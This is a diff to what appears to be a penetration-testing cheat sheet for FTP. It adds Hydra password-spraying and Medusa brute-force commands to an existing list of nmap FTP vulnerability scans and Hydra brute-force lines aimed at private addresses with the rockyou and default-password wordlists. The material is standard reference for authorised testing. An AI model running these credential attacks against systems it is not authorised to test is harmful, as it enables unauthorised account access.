@@ -118,13 +118,19 @@ https://www.robtex.com/
 nmap -p 21 -sV -sC --script="ftp-vuln-*, ftp-anon" 10.0.0.1-254
 ```
 
-#### ➤ Hydra - Bruteforcing
+#### ➤ Bruteforcing
 ```
-#Bruteforce specific user
+#Hydra - Password spraying
+hydra -s 21 -t 4 -L username.lst -p password01! 10.0.0.1 ftp
+
+#Hydra - Bruteforce specific user
 hydra -s 21 -t 4 -l admin -P /usr/share/wordlists/rockyou.txt 10.0.0.1 ftp
 
-#Bruteforce common login:passord
+#Hydra - Bruteforce common login:passord
 hydra -s 21 -C /home/kali/wordlists/legion/ftp-betterdefaultpasslist.txt -u -f 10.0.0.1 ftp
+
+#Medusa
+medusa -h 10.10.10.10 -u user -P passwords.txt -M ftp 
 ```
 
 #### ➤ Basic Connection and FTP commands
